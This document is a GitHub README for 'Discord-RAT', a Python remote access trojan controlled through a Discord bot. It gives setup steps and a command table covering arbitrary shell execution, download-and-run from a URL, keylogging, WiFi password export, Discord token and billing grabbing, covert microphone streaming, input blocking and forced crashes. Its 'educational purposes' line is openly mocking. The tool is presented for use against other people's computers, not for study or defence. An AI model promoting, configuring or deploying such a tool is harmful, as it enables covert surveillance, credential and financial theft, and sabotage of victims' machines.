# Discord-RAT
A remote administration Tool over discord. Easy to use, undetected and powerfull.

This Python Programm basically hosts a discord bot on the Computer its executed on, which allows the user who configured it to remotely control the computer via Discord commands. It supports a variety of features such as executing commands, taking screenshots, managing files, and more.
It can handle multiple Devices at once.

## Oh, yeah and only for Educational Purposes of course < 3 hehe

[![Stargazers repo roster for @truelockmc/Discord-RAT](https://reporoster.com/stars/dark/truelockmc/Discord-RAT)](https://github.com/truelockmc/Discord-RAT/stargazers)

## Features

- **📶 Ping:** Check the bot's latency.  
- **📸 Screenshot:** Take a screenshot and send it via Discord.  
- **💻 Execute Commands:** Run any CMD and PowerShell commands.  
- **📂 File Management:** Upload and download files.  
- **🌐 Remote Execution:** Download and execute any programs from a URL.  
- **🔔 Notifications:** Send system notifications.  
- **🖥️ System Control:** Restart or shut down the computer.  
- **🔑 Admin Rights:** Elevate the bot to run with admin privileges.  
- **📡 WiFi Credentials:** Export and send WiFi profiles and passwords.  
- **📝 System Info:** Retrieve system information.  
- **⚙️ Task Management:** List and kill processes.  
- **🧹 Purge Messages:** Clear bot messages and commands in the channel.  
- **🎙️ Live Stream Mic:** Livestream the computer’s microphone to a Discord voice channel.  
- **⌨️ Keylogger:** Log keystrokes and send them to a Discord channel.  
- **🗣️ TTS:** Play Text-to-Speech messages on the computer.  
- **⛔ Denial of Service:** Block the user's input (keyboard & mouse) or make the screen black with a hidden cursor.  
- **💥 Crash/BSOD:** Crash the computer with a forkbomb or Blue Screen of Death.  
- **🎵 Rickroll:** Play a full-screen Rickroll that can only be escaped with the power button or `Ctrl + Alt + Delete`.  
- **🔊 Volume Control:** Change the computer’s volume or mute/unmute it.  
- **🕵️ Token Grabber:** Grab Discord tokens, billing, and contact information.

## Requirements

- Python 3.6+
- Discord.py
- Additional Python packages (listed in `requirements.txt`)

## Installation

1. Clone the repository:
    ```sh
    git clone https://github.com/truelockmc/Discord-RAT.git
    cd Discord-RAT
    ```

2. Install the required packages:
    ```sh
    pip install -r requirements.txt
    ```

3. Set up your `.env` file (see Configuration below)

## Configuration

All credentials are stored in a `.env` file

1. Copy the example file:
    ```sh
    cp .env.example .env
    ```

2. Open `.env` and fill in your values:

    ```env
    BOT_TOKEN=
    GUILD_ID=
    AUTHORIZED_USERS=
    VOICE_CHANNEL_ID=
    ```

### Where to find each value

| Config | Where to get it |
|---|---|
| `BOT_TOKEN` | [Discord Developer Portal](https://discord.com/developers/applications) → Your App → **Bot** → **Token** |
| `GUILD_ID` | Right-click the Discord Server the Bot should operate on → **Copy Server ID** |
| `AUTHORIZED_USERS` | Right-click your profile → **Copy User ID** (comma-separate multiple IDs) |
| `VOICE_CHANNEL_ID` | Right-click the voice channel your Bot should use → **Copy Channel ID** |

> **Note:** Copying IDs requires **Developer Mode** to be enabled in Discord settings: *User Settings → Advanced → Developer Mode*.

## Running the Bot

To run the bot, execute the script:
```sh
python main.py
```

## Commands

| Command                      | Description                                                                                         |
|------------------------------|-----------------------------------------------------------------------------------------------------|
| `!ping`                      | Shows the bot's latency.                                                                            |
| `!screenshot`                | Takes a screenshot and sends it.                                                                    |
| `!cmd <command>`             | Executes a CMD command.                                                                             |
| `!powershell <command>`      | Executes a PowerShell command.                                                                      |
| `!file_upload <target_path>` | Uploads a file to the specified path.                                                               |
| `!file_download <file_path>` | Downloads a file or folder from the specified path. (sends it to discord)                           |
| `!execute <url>`             | Downloads a Programm from the URL and executes it.                                                  |
| `!notify <title> <message>`  | Sends a notification.                                                                               |
| `!restart`                   | Restarts the PC.                                                                                    |
| `!shutdown`                  | Shuts down the PC.                                                                                  |
| `!admin`                     | Requests admin rights.                                                                              |
| `!stop`                      | Stops the bot.                                                                                      |
| `!wifi`                      | Shows WiFi profiles and passwords.                                                                  |
| `!system_info`               | Shows system information.                                                                           |                                                                         |
| `!taskkill <pid>`            | Terminates a process with the specified PID.                                                        |
| `!purge`                     | Deletes the bot messages and commands.                                                              |
| `!help`                      | Displays a list of available commands.                                                              |
| `!tts <message>`             | Plays a custom text-to-speech message.                                                              |
| `!mic_stream_start`          | Starts a live stream of the microphone to a voice channel.                                          |
| `!mic_stream_stop`           | Stops the mic stream if activated.                                                                  |
| `!keylog <on/off>`           | Activates or deactivates keylogging.                                                                |
| `!input <block/unblock>`     | Completely blocks or unblocks the User Input, Keyboard and Mouse.                                   |                                                       |
| `!rickroll`                  | Plays an inescapeable Rickroll.                                                                     |
| `!bsod`                      | Triggers a Blue Screen of Death.                                                                    |
| `!volume`                    | Shows volume information and available commands.                                                    |
| `!volume <mute/unmute>`      | Mutes or unmutes the Device.                                                                        |
| `!volume <number from 1-100>`| Sets the Volume to a specific Percentage.                                                           |
| `!blackscreen <on/off>`      | Makes the Screen completely black and lets the Pointer Disappear.                                   |
| `!grab_discord`              | Grabs Discord Tokens, Billing and Contact Information.                                              |

### Example Usage

1. **Running a CMD command:**
    ```sh
    !cmd dir
    ```

2. **Taking a screenshot:**
    ```sh
    !screenshot
    ```

3. **Restarting the PC:**
    ```sh
    !restart
    ```

## Security

- Ensure that only trusted users have access to the bot by updating the `AUTHORIZED_USERS` list.
- Avoid sharing the bot token publicly.

## Contributing

Feel free to submit issues or pull requests if you have suggestions or improvements.

## License

This project is licensed under the GNU Affero General Public License v3.0 (AGPL-3.0)

## Contact / Help
You can always create an Issue here on Github, contact me on [![Discord](https://img.shields.io/badge/Discord-%237289DA.svg?logo=discord&logoColor=white)](https://discord.gg/wDESTYeZy9), or using my email: anonyson@proton.me.
